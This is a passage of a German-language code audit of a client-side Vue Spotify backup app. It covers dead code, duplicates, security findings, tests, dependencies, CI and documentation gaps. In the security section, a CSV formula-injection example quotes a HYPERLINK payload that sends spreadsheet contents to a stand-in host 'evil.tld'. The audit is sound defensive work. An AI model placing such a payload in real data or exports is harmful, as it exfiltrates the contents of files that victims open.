**Step-Verwaltung.** `setCurrentStep` und `setTotalSteps` werden zehnmal gerufen (`LandingView.vue:235-236`, `SetupView.vue:247,254,295-296`, `BackupView.vue:284-285`, `ImportView.vue:328-329`), die Werte werden aber von keiner Komponente gelesen; `SetupView.vue:232-239` hält eigene Refs. `app.ts:22,41,47,53` sind damit unerreichbar.

**Modals.** `app.ts:15,90-111` und `types/index.ts:166` beschreiben eine Modal-Infrastruktur, für die weder ein Renderer noch ein Aufrufer existiert.

**ThemeToggle.** Verifiziert: Eine Suche über `src/` und `index.html` findet null Treffer für `ThemeToggle`; die Datei hat 47 Zeilen. In der ausgelieferten App gibt es also keine Möglichkeit, das Theme umzuschalten, obwohl `README.md:40` „Dark/Light Mode" als Feature nennt. Die Komponente ruft in `:39-41` außerdem ein zweites Mal `initTheme()` auf, das `App.vue:199-201` bereits ausführt; beim Einbinden liefe die Initialisierung doppelt.

**Backup-Optionen.** Verifiziert: `backupOptions` (`stores/backup.ts:18`) wird ausschließlich in `BackupPreviewView.vue:413` per `setBackupOptions` geschrieben und von keiner Export-Funktion gelesen; `getBackupOptions` (`backup.ts:279`) wird nie aufgerufen. `startBackup` reicht anschließend `backupStore.backupData` ungefiltert an die drei Download-Funktionen weiter (`:422`, `:425`, `:428`). Der Button „Exportieren (N Playlists)" exportiert damit immer alle Playlists inklusive der abonnierten fremden. Das zentrale Feature der Vorschauseite ist wirkungslos.

### Ungenutzte Typen, Klassen und Konfiguration

Zwölf der 24 exportierten Typen in `src/types/index.ts` werden nirgends importiert, darunter `ImportState` (:117), `ImportConflict` (:125), `SetupState` (:134), `ApiResponse` (:144), `SpotifyApiError` (:150), `AppConfig` (:174), `ProgressInfo` (:190) und `BackupEvent` (:198). Das sind rund 60 von 207 Zeilen. Bemerkenswert: `SpotifyApiError` wäre genau der Typ, der beim fehlenden 401- und 429-Handling gebraucht würde.

In `src/style.css` sind `.btn-danger` (:71) und `.form-checkbox` (:105) ohne jeden Treffer. `.stylelintrc.json` existiert, ohne dass `stylelint` installiert wäre. `tsconfig.json:30-32` schließt `src/**/__tests__/*` aus, obwohl das Verzeichnis nicht existiert; das wird zur Falle, sobald Tests hinzukommen, weil diese dann stillschweigend nicht typgeprüft würden, während `type-check` grün meldet.

### Duplikate

**localStorage-Key-Literale.** `'spotify_client_id'` steht fünfmal (`auth.ts:170,180`, `SetupView.vue:282,299`, `useSpotifyAuth.ts:14`), `'spotify_access_token'` viermal (`auth.ts:57,69,77,133`), analog für Refresh-Token, Ablaufzeit, Nutzerprofil, Theme und Code-Verifier. Es gibt keinen zentralen Ort, um alle Daten zu löschen.
*Empfehlung:* `src/constants/storage.ts` mit einem `STORAGE_KEYS`-Objekt.

**Vierfache Fetch- und Pagination-Schleife.** `stores/backup.ts:78-100`, `:105-130` und `:132-153` sind strukturell identisch, `:63-75` ist dieselbe Signatur ohne Pagination. Nur `fetchUserPlaylists` (`:90-91`) liest die Fehlermeldung aus dem Body, die anderen werfen Konstanten. Dazu kommen zwei zeichengleiche Token-POSTs (`useSpotifyAuth.ts:88-100`, `auth.ts:111-121`).

**Dreifacher Blob-Download-Block.** `backup.ts:245-256`, `:294-301` und `:321-328` wiederholen jeweils `new Blob`, `createElement('a')`, `appendChild`, `click`, `removeChild` und `revokeObjectURL`.

**Redirect-URI dreifach berechnet, aus zwei verschiedenen Quellen.** `SetupView.vue:240-241` und `GuideView.vue:347-348` sind zeichengleich, `useSpotifyAuth.ts:15` nutzt dieselbe Formel als Konstante, `stores/auth.ts:8` dagegen `${window.location.origin}/callback` ohne den `VITE_APP_URL`-Override. Bei gesetztem `VITE_APP_URL` (die CI setzt es in `ci.yml:27`) weicht der Store-Wert von dem ab, was Setup-Seite und OAuth-Flow verwenden.

**Wiederholtes Markup.** Die Nutzer-Karte erscheint dreimal (`BackupView.vue:16-33`, `ImportView.vue:45-61`, `BackupPreviewView.vue:17-33`), das Spotify-Logo-SVG sechsmal, das Noten-SVG viermal, das Häkchen-SVG neunmal. Die Setup-Anleitung steht inhaltlich doppelt in `SetupView.vue:55-82` und `GuideView.vue:61-110`.
*Empfehlung:* `components/AuthGate.vue`, `components/UserCard.vue` und ein `components/icons/`-Verzeichnis.

**Doppelte Filter-Defaults.** `stores/backup.ts:20-27` und `BackupPreviewView.vue:334-339` definieren dasselbe Filterobjekt; das Objekt in der View wird von keinem Bedienelement verändert.

**Doppelte DOM-ID.** `index.html:40` und `App.vue:2` vergeben beide `id="app"`, im gerenderten DOM existiert die ID also zweimal.

---

## Sicherheit

*Stand nach Umsetzung: Security-Header, Meta-CSP, `state`-Parameter, CSV-Quoting, Import-Validierung, selbst gehostete Schrift und die Token-Haltung ohne `localStorage` sind umgesetzt. Offen ist allein die Gegenprüfung der Header am Live-System nach dem nächsten Deploy.*

Das Gesamtbild ist konservativ und begrenzt den Schaden von vornherein: kein Backend, kein Client-Secret, PKCE mit S256 korrekt umgesetzt (`useSpotifyAuth.ts:25-42`, 32 Byte aus `crypto.getRandomValues`, base64url ohne Padding, damit 43 Zeichen und innerhalb der von RFC 7636 geforderten Spanne), kein `v-html` und keine sonstigen XSS-Senken, `rel="noopener noreferrer"` an allen elf externen Links, keine Sourcemaps im Produktionsbuild, keine Tokens in Logs, keine Secrets in der Historie und kein eingebettetes Drittanbieter-Skript. Die Schwächen liegen in der Auslieferung, im Auth-Flow und in den Exportformaten.

**Hoch: Tokens im `localStorage` ohne Gegengewicht.** `stores/auth.ts:69-72` schreibt Access-Token, Refresh-Token, Ablaufzeit und das Nutzerprofil samt E-Mail dauerhaft in den `localStorage`; `:133-137` erneuert sie beim Refresh. Der Spotify-Refresh-Token ist praktisch unbegrenzt gültig. Ein einziger Injection-Vektor oder ein kompromittiertes Drittanbieter-Asset genügt für dauerhaften Lesezugriff auf Playlists, Bibliothek und Profil, auch nachdem der Nutzer den Tab geschlossen hat.
*Empfehlung:* Access-Token nur im Speicher halten, Refresh-Token in den `sessionStorage` verschieben, den Nutzer im Setup über die Konsequenz informieren (Maßnahme 28).

**Hoch: keine Security-Header.** Verifiziert: `firebase.json:15-34` definiert ausschließlich zwei `Cache-Control`-Regeln. Es gibt keine `Content-Security-Policy`, kein `X-Content-Type-Options`, kein `X-Frame-Options` oder `frame-ancestors`, keine `Referrer-Policy` und keine `Permissions-Policy`, weder als Header noch als Meta-Tag in `index.html`. Ohne `connect-src` kann ein eingeschleustes Skript Tokens an einen beliebigen Host senden, ohne `frame-ancestors` lässt sich der Anmelde-Button per Clickjacking auslösen. `README.md:135` behauptet unter „Sicherheit" das Gegenteil.
*Empfehlung:* Header-Block für `source: "**"` mit `default-src 'self'`, `connect-src 'self' https://api.spotify.com https://accounts.spotify.com`, `img-src` für die Spotify-CDNs, `frame-ancestors 'none'`, `base-uri 'none'`, `object-src 'none'` sowie `nosniff` und `strict-origin-when-cross-origin`.
*Unsicher:* Ob Firebase Hosting auf `*.web.app` von sich aus HSTS setzt, ließ sich offline nicht prüfen; nach dem Deploy mit `curl -I` gegenprüfen und `Strict-Transport-Security` bei Bedarf explizit setzen.

**Mittel: OAuth-Flow ohne `state`-Parameter.** Verifiziert: `useSpotifyAuth.ts:61-67` setzt `response_type`, `client_id`, `scope`, `redirect_uri`, `code_challenge_method` und `code_challenge`, aber keinen `state`; `CallbackView.vue:60-87` prüft entsprechend keinen. Ein Angreifer kann das Opfer mit einem fremden `?code=` auf den Callback locken und dort einen Token-Request auslösen.
*Einordnung:* Da PKCE aktiv ist und der Verifier im `sessionStorage` nicht zur fremden Challenge passt, schlägt der Austausch fehl; die praktische Ausnutzbarkeit ist stark eingeschränkt, und RFC 9700 lässt PKCE als CSRF-Ersatz für Public Clients gelten. Es bleibt, dass die App keine Bindung zwischen gestartetem und zurückkehrendem Flow hat.

**Mittel: CSV-Formel-Injection.** `stores/backup.ts:289` setzt Werte nur in Anführungszeichen. Führende `=`, `+`, `-`, `@`, Tabulatoren oder Wagenrückläufe werden nicht neutralisiert. Ein Playlist- oder Tracktitel wie `=HYPERLINK("https://evil.tld?d="&A1,"Klick")` landet unverändert in der Datei; öffnet das Opfer sie in Excel oder LibreOffice und bestätigt den Formeldialog, wird Inhalt exfiltriert. Über kollaborative Playlists und Katalog-Metadaten sind angreiferkontrollierte Namen realistisch.
*Empfehlung:* Eine `csvCell()`-Hilfsfunktion, die quotet, innenliegende Anführungszeichen verdoppelt und bei gefährlichem ersten Zeichen ein Apostroph voranstellt. Deckt sich mit Maßnahme 6.

**Mittel: Import ohne echte Schemavalidierung und ohne Größenlimit.** `ImportView.vue:247-271` prüft nur die Existenz von vier Feldern, nicht Typ, Array-Natur oder Feldlängen. `data.metadata` wird gar nicht validiert, aber in `:127`, `:131` und `:315` dereferenziert, sodass eine Datei ohne `metadata` die Vorschau in einen ungefangenen Fehler laufen lässt. Die Datei wird über `await file.text()` (`:256`) komplett in den Speicher gelesen, auch der Drop-Handler (`:241-245`) kennt kein Limit; die Erweiterungsprüfung (`:248`) betrachtet nur den Dateinamen.
*Kein Befund:* Prototype Pollution, da `JSON.parse` `__proto__` als eigene Property anlegt und keine rekursive Merge-Funktion existiert.

**Mittel: Google Fonts als undokumentierter Dritter.** `index.html:33-35` lädt Inter von `fonts.googleapis.com`, also bei jedem Aufruf einschließlich `/callback`, und überträgt dabei IP-Adresse und User-Agent. `PRIVACY.md:20-24` listet nur Spotify-Endpunkte und Firebase Hosting, `README.md:142` wirbt mit „keine Tracking-Cookies, kein Analytics". Ohne CSP kann ein manipuliertes Stylesheet zudem beliebiges CSS einschleusen.
*Empfehlung:* Inter selbst hosten; das löst Datenschutz- und CSP-Problem in einem Schritt.

**Niedrige Befunde.** Der Code-Verifier wird nur im Erfolgspfad gelöscht (`useSpotifyAuth.ts:131`), nicht im `catch`. `logout()` (`auth.ts:51-61`) räumt weder den Verifier noch den Backup-Store ab, der nach dem Abmelden weiterhin alle Playlists, Tracks und die E-Mail im Speicher hält. Der Autorisierungscode bleibt zwei Sekunden in der Adressleiste und dauerhaft in der History, weil `CallbackView.vue:78-80` `router.push` statt `replace` verwendet und im Fehlerfall gar nicht navigiert. Die Client-ID-Validierung in `SetupView.vue:258-282` prüft nur Länge und Alphanumerik statt der tatsächlichen 32 Hexadezimalzeichen. Die M3U-Erzeugung interpoliert Namen ungefiltert in ein zeilenbasiertes Format (`backup.ts:314,317-318`), wodurch ein Zeilenumbruch im Namen einen fremden Eintrag einschleusen könnte; *unsicher*, ob Spotify Zeilenumbrüche in Playlist- oder Tracknamen überhaupt zulässt. Der Dateiname selbst ist sauber saniert (`:324`), Path Traversal ist ausgeschlossen. Schließlich greift die Cache-Regel `**/*.@(js|css)` (`firebase.json:16-24`) wegen des SPA-Rewrites auch für nicht existierende Pfade: Eine Anfrage an `/beliebig.js` liefert die HTML-Shell mit einem Jahr Lebensdauer, während für `index.html` selbst keine Regel definiert ist. *Unsicher*, welchen Default Firebase Hosting für HTML setzt; nach dem Deploy gegenprüfen. Die Regeln gehören auf `/assets/**` eingeschränkt und `index.html` auf `no-cache`.

**Ohne Befund geprüft.** Keine XSS-Senken: Eine Suche nach `v-html`, `innerHTML`, `insertAdjacentHTML`, `document.write`, `eval(` und `new Function` liefert null Treffer; sämtliche Spotify- und Importdaten werden per Mustache-Interpolation gerendert und damit von Vue escaped. Bild-URLs aus Fremddaten sind unkritisch, weil `javascript:`-URLs in `img src` nicht ausführbar sind. Kein Open-Redirect: `REDIRECT_URI` stammt aus `VITE_APP_URL` oder `window.location.origin`, beides nicht angreiferkontrolliert. Keine Tokens in den sieben `console.*`-Aufrufen, keine Secrets über alle neun Commits hinweg.

---

## Testabdeckung

*Stand nach Umsetzung: Vitest ist eingerichtet, 306 Tests in sieben Dateien decken die Services und die Stores `auth` und `import` ab, der Test-Step läuft in der CI. Views und Komponenten sind weiterhin ungetestet.*

Es gibt keine Tests: 19 Dateien mit 3530 Zeilen unter `src/`, keine `*.test.*`, keine `*.spec.*`, kein `__tests__/`, kein Test-Runner in `package.json:7-15` und kein Test-Schritt in der CI.

**Was am dringendsten Tests braucht,** bewertet nach Schadenshöhe bei stillem Fehlverhalten mal Unsichtbarkeit beim manuellen Klicken:

| Rang | Modul | Begründung | Testbarkeit heute |
|---|---|---|---|
| 1 | CSV- und M3U-Formatierung, `stores/backup.ts:282-336` | Reine String-Erzeugung mit zwei nachgewiesenen Bugs; im Browser unsichtbar, fällt erst in Excel auf | schlecht, DOM-Download fest verdrahtet |
| 2 | Token-Ablauf und Refresh, `stores/auth.ts:25-28,104-161` | Fehler bedeuten stillen Logout; manuell nur mit einer Stunde Wartezeit prüfbar | gut, `fetch` und `Date.now` mockbar |
| 3 | Pagination, `stores/backup.ts:78-153` | Ein Fehler bei `data.next` erzeugt ein stillschweigend unvollständiges Backup | gut |
| 4 | PKCE-Helfer, `useSpotifyAuth.ts:25-42` | Ein falsches base64url-Zeichen bricht den Login bei Spotify ab | schlecht, in einer Closure eingeschlossen |
| 5 | Import-Parsing, `ImportView.vue:247-271` | Prüft nur Existenz; ein Array statt eines Objekts passiert die Prüfung | schlecht, im SFC-Setup |
| 6 | `loadFromStorage`, `stores/auth.ts:75-102` | `JSON.parse` und `parseInt` ohne Radix auf Fremddaten; korrupter Storage darf die App nicht lahmlegen | gut |

**Nachweislich vorhandene Bugs, die ein Test sofort gefangen hätte.** Verifiziert: `stores/backup.ts:121-124` mappt `data.items` auf `item.track` und verwirft damit `added_at`, das laut Spotify-API auf dem Wrapper-Objekt sitzt. `types/index.ts:48` deklariert `added_at?: string` auf `SpotifyTrack`, wo es nie befüllt wird. `stores/backup.ts:289` bildet daraus `new Date(track.added_at || '').toLocaleDateString()`, was reproduzierbar „Invalid Date" ergibt: Die Spalte „Added Date" ist in jedem Export unbrauchbar. Dieselbe Zeile quotet ohne Verdopplung innenliegender Anführungszeichen, sodass eine Playlist namens `My "Best" Mix` ab dieser Zeile einen Spaltenversatz erzeugt. Ergänzend fehlen die Favoriten im CSV vollständig, weil die Funktion nur `backupData.playlists` durchläuft, obwohl `BackupView.vue:79` sie als Teil des Exports ausweist. Und zwei Playlists namens „Rock 2024" und „Rock/2024" ergeben über `backup.ts:324` denselben Dateinamen.

**Minimales Setup:** `vitest`, `@vue/test-utils`, `happy-dom` und `@vitest/coverage-v8`, Konfiguration über die bestehende `vite.config.ts` (Import aus `vitest/config`), `tsconfig.json:30-32` entfernen, Script `"test": "vitest run"` plus CI-Schritt zwischen Lint und Build. Die nötigen Refactorings sind rein additiv und brechen kein Verhalten: `buildCsv` und `buildM3u` als exportierte reine Funktionen in `src/utils/export.ts`, die Fetch-Funktionen aus `backup.ts:78-153` als freie Funktionen mit `accessToken`-Parameter, die PKCE-Helfer nach `src/utils/pkce.ts`, die Import-Validierung als `parseBackupFile(text)` und das `routes`-Array aus `main.ts:17-64` exportieren.

Die ersten sieben Testfälle decken genau die Risiken oben ab: kein „Invalid Date" bei fehlendem `added_at`, RFC-4180-konformes Quoting, stabiler M3U-Header mit `#EXTINF`-Zeile je Track, Pagination über drei Seiten bis `next: null`, `isTokenExpired` an den drei Grenzfällen, Refresh-Token-Rotation inklusive HTTP-400-Pfad und die PKCE-Konformität von Verifier und Challenge. Gesamtaufwand: etwa ein Arbeitstag für rund 60 bis 70 Prozent Abdeckung der Logikmodule. Views bleiben bewusst ungetestet.

---

## Dependency-Risiken

*Stand nach Umsetzung: Die ungenutzten Pakete sind entfernt, `jszip` blieb und wird jetzt für die ZIP-Exporte genutzt. `npm audit` meldet im vollen Baum wie mit `--omit=dev` null Findings, seit die Deploy-Werkzeugkette des Originals mit Maßnahme 29 entfallen ist. Die Stufen U1 bis U5 sind mit Paket G erledigt, U8 ebenfalls; offen sind noch U6 und U7.*

`npm audit` meldet 54 Findings (2 low, 21 moderate, 28 high, 3 critical) bei 71 Produktiv- und 824 Dev-Abhängigkeiten und 334 MB `node_modules`. Alle drei kritischen Befunde (`basic-ftp`, `protobufjs`, `tar`) hängen transitiv an `firebase-tools`.

**Wichtige Einordnung:** Diese 54 Findings sind kein Risiko für die ausgelieferte App. Es gibt kein Backend, und ins Bundle gelangen laut `vite.config.ts:16-18` nur `vue`, `vue-router` und `pinia`. Das reale Risiko ist die Lieferkette in der CI und auf Entwicklerrechnern, wo jeder `npm ci` Lifecycle-Skripte verwundbarer Pakete ausführt.

Auf den Produktivbaum eingeschränkt (`npm audit --omit=dev`) bleiben fünf Findings (1 moderate, 4 high); betroffen sind `axios`, `form-data`, `nanoid` und `postcss`. Von diesen entfallen alle, die überhaupt Anwendungscode betreffen könnten, mit dem Entfernen von `axios`.

**Fünf Dependencies werden nirgends importiert:** `@vueuse/core`, `axios`, `crypto-js`, `jszip` und `file-saver` (`package.json:17-21`), dazu `@types/crypto-js` und `@types/file-saver` (`:29-30`). HTTP läuft über natives `fetch`, PKCE über die Web Crypto API, Downloads über `URL.createObjectURL`. `axios` widerspricht damit direkt der Vorgabe in `CLAUDE.md`.
*Reihenfolge beim Entfernen:* zuerst `tsconfig.json:22` (`"types": ["vite/client", "file-saver"]`) und `src/types/file-saver.d.ts` bereinigen, sonst bricht `vue-tsc` mit „Cannot find type definition file". Alternativ ließen sich `jszip` und `file-saver` beim Reparieren des M3U-Exports (Maßnahme 27) tatsächlich einsetzen, wofür sie ursprünglich gedacht waren.

**Kein einziges Paket ist auf `Latest`,** und bei neun Paketen deckt die Caret-Range den aktuellen Major nicht mehr ab. `caniuse-lite` ist 13 Monate alt. Das ist die direkte Folge des fehlenden Dependabot.

| Stufe | Maßnahme | Risiko | Aufwand | Status |
|---|---|---|---|---|
| U0 | Ungenutzte Pakete entfernen | sehr niedrig, nichts importiert sie | S | erledigt (`53d628b`) |
| U1 | `npm update` innerhalb der Ranges (`vue`, `postcss`, `vite`, `vue-router`, `autoprefixer`, Tailwind-Plugins) | sehr niedrig, nur Patch und Minor | S | erledigt (`53d628b`) |
| U2 | `vue-tsc` 1.8 auf 3.x; zieht heute das verwundbare `vue-template-compiler` über `@vue/language-core` | mittel bis hoch, 3.x ist strenger und deckt vermutlich neue Typfehler auf | M | erledigt (Paket G, 3.3.11 – keine neuen Typfehler) |
| U3 | `typescript` von `~5.3` schrittweise anheben (5.3, 5.5, 5.7), nicht direkt auf 7 | mittel | M | erledigt (Paket G, `~5.9.3`; 7.x bleibt bewusst aus, `typescript-eslint` deckt nur `<6.1.0` ab) |
| U4 | `eslint` 8 (End of Life) auf 9, dabei Migration auf Flat Config, zusammen mit der Regelverschärfung | mittel bis hoch | M | erledigt (Paket G, direkt auf 10.10.0) |
| U5 | `vite` 5 auf 6/7/8 plus `@vitejs/plugin-vue` 4 auf 6; die Config ist mit 25 Zeilen minimal | mittel | M | erledigt (Paket G, Vite 7.3.6 + Plugin 6.0.8; Vite 8 bleibt aus, weil es auf Rolldown wechselt) |
| U6 | `pinia` 2 auf 4, `vue-router` 4 auf 5; erst nach den Tests, sonst ohne Sicherheitsnetz | mittel bis hoch | M-L | **offen** – Laufzeit-Abhängigkeiten, bewusst nicht Teil des Toolchain-Upgrades; `@pinia/testing` hängt daran |
| U7 | `tailwindcss` 3.4 auf 4.x; kompletter Config- und Engine-Wechsel, 3.4 wird gepflegt | hoch, kein Handlungsdruck | L | **offen** – in `.github/dependabot.yml` als Major ignoriert |
| U8 | `firebase-tools` entfernen und per `npx` beziehungsweise in einer Deploy-Action nutzen | niedrig, entfernt den Großteil aller Findings und rund 824 Dev-Deps | S | erledigt – ersatzlos entfernt, weil der Fork hinter Caddy hostet (Maßnahme 29). 591 Pakete weniger, `npm audit` meldet null Findings im vollen Baum |

**Lizenzen:** keine Auffälligkeiten. Der Produktivbaum besteht aus `vue`, `vue-router` und `pinia` (alle MIT) plus den ungenutzten Paketen. Kein Copyleft-Risiko im Auslieferungsartefakt, erst recht nicht nach U0.

---

## CI und Tooling

*Stand nach Umsetzung: Der Workflow prüft type-check, lint, test und build auf der Node-Version aus `.nvmrc` und hat `permissions`, `concurrency` und `timeout-minutes`. Ob GitHub Actions im Repository aktiviert ist, lässt sich von hier aus nicht feststellen; ein Deploy-Job fehlt weiterhin.*

**Die CI hat vermutlich nie gelaufen.** `.github/workflows/ci.yml` liegt nachweislich auf `main` und ist auch serverseitig unter `ref=main` abrufbar, dennoch liefert die GitHub-API sowohl für die registrierten Workflows als auch für die Runs `total_count: 0`. Eine Workflow-Datei auf dem Default-Branch wird normalerweise automatisch registriert, selbst wenn sie nie lief.
*Unsicher, so aus dem Quellbericht übernommen:* Die Repository-Einstellung `actions.enabled` war über die verfügbaren API-Aufrufe nicht direkt auslesbar. „Actions ist deaktiviert" ist die plausibelste, aber nicht bewiesene Erklärung; eine Sperre auf Organisationsebene führt zum selben Beobachtungsbild. Der Commit `a1fc1c1 "fix: add missing ESLint config to fix CI lint errors"` legt zwar nahe, dass die CI einmal lief, ist mit null Runs aber nicht vereinbar.
*Auswirkung:* Sämtliche Qualitätszusagen in `CONTRIBUTING.md:11-16` sind unerzwungen und aktuell verletzt.

**Lokale Ausführung der drei CI-Schritte.** Verifiziert: `npm run type-check` scheitert mit drei TS6133-Fehlern (`BuyMeACoffee.vue:35`, `stores/theme.ts:2`, `CallbackView.vue:51`); Ursache sind `noUnusedLocals` und `noUnusedParameters` in `tsconfig.json:15-16`. Da dies der dritte von fünf Schritten ist, würden Lint und Build in einem echten Lauf nie erreicht. `npx eslint` meldet dieselben drei Stellen nur als Warnungen und beendet mit Exit-Code 0. `npm run build` ist erfolgreich (50 Module, 86,49 kB plus 90,63 kB Bundle, 3,2 Sekunden).

**Das Lint-Gate ist wirkungslos.** `package.json:11` definiert `lint` mit `--fix`, und `ci.yml:24` ruft genau dieses Script. Drei Probleme, aufsteigend nach Schwere: Die Korrekturen werden im Runner geschrieben und danach verworfen, sie werden vor dem Zählen angewendet und maskieren damit den tatsächlich committeten Zustand, und ohne `--max-warnings 0` laufen selbst nicht behebbare Probleme durch.
*Empfehlung:* `lint` mit `--max-warnings 0` für die CI, `lint:fix` für lokal; die Beschreibung in `CLAUDE.md` mitziehen, die `npm run lint` bislang als schreibend dokumentiert.

**Die ESLint-Konfiguration ist zu schwach.** `.eslintrc.cjs:4-7` nutzt `plugin:vue/vue3-essential`, die niedrigste der drei Stufen, und ergänzt kein `eslint:recommended`. Belegte Konsequenz: Genau die Probleme, die `vue-tsc` als Fehler meldet, sind bei ESLint nur Warnungen; die Konfiguration ist schwächer als der Typprüfer, den sie ergänzen soll. Weitere Muster, die strengere Regelsätze markieren würden: `(item: any)` in `stores/backup.ts:122-123`, `parseInt(expiresAt)` ohne Radix in `stores/auth.ts:84` und drei `catch`-Blöcke mit ungenutzter Variablen.

**Die Node-Version ist dreifach inkonsistent.** `package.json:44-46` fordert `>=18.0.0`, `ci.yml:14-17` baut auf Node 18 (seit dem 30.04.2025 End of Life), lokal läuft Node 22, und es gibt weder `.nvmrc` noch `.node-version`. Die einzige Umgebung, in der je gebaut wird, ist damit eine andere als die der Entwickler. Der Build ist unter Node 22 nachweislich grün, das Umstellungsrisiko ist minimal.

**Weitere Lücken im Workflow.** Der npm-Cache ist vorhanden (`ci.yml:18`), es fehlen aber `concurrency` (mehrere Pushes auf einen PR laufen sonst alle zu Ende), `permissions: contents: read` als Least Privilege für den `GITHUB_TOKEN` und `timeout-minutes`. `actions/checkout@v4` und `actions/setup-node@v4` sind per Major-Tag gepinnt, was gängige Praxis ist; *unsicher*, ob v5 inzwischen der aktuelle Major ist, das ließ sich in der Quellsitzung nicht verifizieren. Eine Branch Protection auf `main` ist nirgends dokumentiert und erst sinnvoll, sobald die CI läuft und grün ist. Ein Deploy-Job fehlt vollständig: Der einzige Weg ist `firebase deploy` vom Entwicklerrechner (`package.json:14`), womit weder der Live-Stand einem Commit zuzuordnen noch ein Rollback möglich ist und der CI-Build-Artefakt verworfen statt verwendet wird.

**Kleinere Tooling-Befunde.** `VITE_SPOTIFY_CLIENT_ID: dummy_for_build` (`ci.yml:28`) existiert ausschließlich in der CI-Datei, ist weder in `env.d.ts` deklariert noch irgendwo per `import.meta.env` gelesen; die Zeile suggeriert eine Client-ID zur Buildzeit, was dem gesamten Sicherheitskonzept widerspricht. `env.d.ts:5` deklariert `VITE_APP_URL` als nicht optional, obwohl der Code sie überall mit `|| window.location.origin` absichert. `tsconfig.json:9` `allowImportingTsExtensions` wird nirgends genutzt, ist wegen `noEmit: true` aber harmlos. Es gibt keine `.editorconfig`, obwohl `CLAUDE.md` einen Stil festlegt; acht Zeilen würden ihn ohne Editor-Plugin durchsetzen. `package.json:3` deklariert Version 2.0.0, `git tag` ist leer, und `stores/backup.ts:213` schreibt dieselbe Version hart codiert in jedes Backup-Artefakt, obwohl `ImportView.vue:260` beim Import darauf prüft; die Formatversion gehört in eine einzige Konstante.

---

## Dokumentation vs. Code

*Stand nach Umsetzung: Bis auf die Metadaten in `index.html` (`og:url`, `twitter:url`) und die uneinheitlichen Produktnamen sind alle Punkte dieser Tabelle behoben. Die Doku-Dateien selbst wurden im Anschluss an die Umsetzung nachgezogen.*

| Aussage | Fundstelle | Realität |
|---|---|---|
| „App.vue: Layout: Nav, Footer, Toasts, Theme-Init" | `CLAUDE.md` | Falsch, es gibt keine Toast-Darstellung |
| „CSP Headers, Content Security Policy" | `README.md:135` | Falsch, `firebase.json` setzt nur `Cache-Control` |
| „Moderne UI/UX, Responsive Design mit Dark/Light Mode" | `README.md:40` | Kein Umschalter eingebunden; die Palette ist zudem dark-only (`tailwind.config.js:47-50`), `style.css:15-29` definiert Overrides nur für `.dark` |
| „Keine Tracking-Cookies, kein Analytics" | `README.md:142`, `PRIVACY.md:17` | Zutreffend für Cookies und Analytics, aber Google Fonts überträgt bei jedem Aufruf IP und User-Agent |
| Datenflüsse: Spotify plus Firebase Hosting | `PRIVACY.md:20-24` | Unvollständig, Google Fonts fehlt |
| „Code Verifier wird nach Abschluss entfernt" | `PRIVACY.md:7` | Nur im Erfolgspfad |
| „Über Abmelden werden Tokens im Browser entfernt" | `PRIVACY.md:27` | Zutreffend für die vier Token-Keys; Backup-Daten und Verifier bleiben |
| localStorage-Key `spotify_redirect_uri` | `CLAUDE.md` | Wird nur von `setRedirectUri` (`auth.ts:176`) geschrieben, das nie aufgerufen wird; der Key existiert effektiv nie und fehlt zudem in `PRIVACY.md` |
| Projektstruktur mit `src/utils/` und `src/assets/` | `README.md:103,105` | Existieren nicht, in `CLAUDE.md` bereits korrigiert |
| „cp env.example .env und Werte setzen" | `CONTRIBUTING.md:8` | `env.example` enthält nur auskommentierte Zeilen; laut `README.md:59` ist keine `.env` nötig |
| „Alle drei vor dem PR grün" | `CONTRIBUTING.md:16`, `SECURITY.md:21` | `type-check` ist rot, und es gibt keine CI, die es prüfen würde |
| `og:url` und `twitter:url` = `myspotbackup.app` | `index.html:16,23` | Live-URL ist `spotify-backup-free.web.app`; parallel laufen drei Produktnamen („MySpotBackup" in `main.ts:22-58`, „SpotMyBackup 2" in `App.vue:14`) |
| „Ja, du kannst dein Backup in jeden anderen Spotify-Account importieren" | `GuideView.vue:266-270` | Der Import ist simuliert; die nötigen Scopes `playlist-modify-*` und `user-library-modify` fehlen in `useSpotifyAuth.ts:16-22` ohnehin |
| „Kein Client-Secret, keine API-Keys im Repo" | `CLAUDE.md`, `SECURITY.md` | Bestätigt, auch über die gesamte Historie |
| „Deprecated Endpunkte nicht verwenden" | `CLAUDE.md` | Eingehalten: `/v1/me`, `/v1/me/playlists`, `/v1/playlists/{id}/items`, `/v1/me/tracks` |
| „Stores im Setup-Stil, `state` als ein `ref`" | `CLAUDE.md` | Teilweise verletzt, siehe Kapitel Architektur |
| `axios`, `crypto-js`, `jszip`, `file-saver`, `@vueuse/core` ungenutzt | `CLAUDE.md` | Bestätigt, ergänzend auch `@types/crypto-js`, `@types/file-saver` und der `types`-Eintrag in `tsconfig.json:22` |

---

## Was bewusst nicht empfohlen wird

**Kein Framework-Wechsel.** Vue 3 mit Composition API und Pinia passt zum Umfang, der Code ist stilistisch konsistent, und keiner der Befunde hat seine Ursache in der Framework-Wahl. Eine Migration würde alle offenen Punkte neu erzeugen, statt einen davon zu lösen.

**Kein Backend.** Der Verzicht darauf ist der Kern des Sicherheitskonzepts: kein Client-Secret, keine serverseitig gespeicherten Nutzerdaten, kein Betriebsaufwand. Die Token-Probleme löst man innerhalb des Browsers (Maßnahmen 4 und 28), nicht durch einen Server, der dann selbst zum Ziel würde.

**Kein Tailwind-4-Upgrade.** Version 4 ist ein Config- und Engine-Wechsel; `tailwind.config.js` definiert eigene Theme-Tokens und `src/style.css` nutzt `@layer components` mit `@apply`. 3.4 wird gepflegt, es gibt keinen Handlungsdruck.

**Kein Prettier.** Der Stil ist in `CLAUDE.md` dokumentiert und im Code tatsächlich konsistent. Falls Durchsetzung gewünscht ist, sind ein paar ESLint-Regeln (`semi`, `quotes`, `indent`) der billigere Weg als ein zusätzliches Werkzeug.

**Keine Component-Tests für statische Views.** `GuideView.vue`, `LandingView.vue` und `ThemeToggle.vue` enthalten im Wesentlichen Text und Markup; Tests dort kosten Pflegeaufwand ohne Ertrag.

**Keine Build-Matrix in der CI.** Eine einzelne, aktuelle Node-Version ist für eine reine Client-App angemessen.
